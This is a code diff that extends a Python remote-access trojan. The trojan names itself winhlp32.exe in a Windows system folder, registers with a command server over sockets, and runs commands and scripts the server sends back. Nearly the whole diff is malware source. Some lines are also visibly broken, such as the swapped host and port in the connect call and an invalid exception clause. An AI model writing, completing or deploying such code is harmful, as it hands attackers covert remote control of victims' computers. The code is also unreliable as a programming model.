@@ -33,6 +33,11 @@ class ScriptError(Exception):
     def __init__(self, string):
         self.message = string
 
+class SocketConnectionError(Exception):
+
+    def __init__(self, string):
+        self.message = string
+
 
 class TCPServer(threading.Thread):
     """
@@ -132,19 +137,56 @@ class TCPServer(threading.Thread):
         self._stop()
 
 
+class TrojanClient:
+
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.socket = socket.socket()
+        self.send_buffer = []
+
+    def add(self, string):
+        self.send_buffer.append(string)
+
+    def flush(self):
+        """
+        flushes the data, which is currently in the sending buffer into the socket connection, waits to receive the
+        reply and returns this
+        :return: (string)
+        """
+        # creating the string to send from the buffer
+        string = ""
+        for item in self.send_buffer:
+            string += str(item)
+        # creating an connecting the socket
+        try:
+            self.socket.connect((self.port, self.ip))
+            self.socket.sendall(str.encode(string))
+            reply = self.socket.recv(4096)
+            return str(reply)[2:-1]
+        except socket.errno:
+            raise SocketConnectionError("failed to flush data into the socket, as the socket couldn't connect")
+
+    def change_port(self, port):
+        self.port = port
+
+
 class Trojan(threading.Thread):
 
-    def __init__(self, port, server):
+    def __init__(self, connection_port=8000, server_ip="127.0.0.1"):
         super(Trojan, self).__init__()
         # the default path of the trojan on the windows computer
         self.path = "C:\\Windows\\Help\\Windows"
         self.name = "winhlp32.exe"
-        self.port = port
+        self.id = "blank"
+        self.server_ip = server_ip
+        # the port setup for the initial and permanent connection
+        self.connection_port = connection_port
+        self.port = 0
         # setting up the protocols for the trojan
-        self.script = {}
-        self.server = server
-        # the sequence symbolizing, that the trojan has finished writing into the TCP connection socket
-        self.end_sequence = "<;end;>"
+        # self.script = {}
+        self.client = TrojanClient(self.server_ip, self.connection_port)
+        self.connected = True
 
     def run(self):
         """
@@ -156,17 +198,44 @@ class Trojan(threading.Thread):
         # enters the main loop without the break condition
         count = 0
         while True:
-            # receives the next buffered message from the server object
-            cmd = self.server.receive()
-            # depending on the received prefix, executes the input either
-            if cmd is not None:
-                if cmd == "ping":
-                    self.server.send("ping")
-                elif cmd[:2] == "c:":
-                    self.execute_command(cmd[2:])
-                elif cmd[:2] == "s:":
-                    self.execute_script(cmd[2:])
-            time.sleep(0.01)
+            if self.connected is False:
+                # attempting to connect to the Distribution Server
+                self.client.change_port(self.connection_port)
+                self.client.add("conn:" + self.id)
+                reply = self.client.flush()
+                if reply != "":
+                    try:
+                        self.port = int(reply)
+                        self.client.change_port(self.port)
+                        self.client.add("ping")
+                        reply = self.client.flush()
+                        if reply == "ping":
+                            self.connected = True
+                            time.sleep(0.01)
+                    except ValueError:
+                        pass
+            elif self.connected is True:
+                try:
+                    self.client.add("expecting")
+                    reply = self.client.flush()
+                    if reply != "":
+                        prefix = reply[:2]
+                        command = reply[2:]
+                        if prefix == "c:":
+                            self.execute_command(command)
+                        elif prefix == "s:":
+                            self.execute_script(command)
+                        # after the command has been executed, ang the replies have been added to the sending buffer
+                        # flushing it into the socket connection
+                        self.client.flush()
+                    else:
+                        self.connected = False
+                        self.port = 0
+                except SocketConnectionError:
+                    self.connected = False
+                    self.port = 0
+
+
 
     def execute_command(self, command):
         """
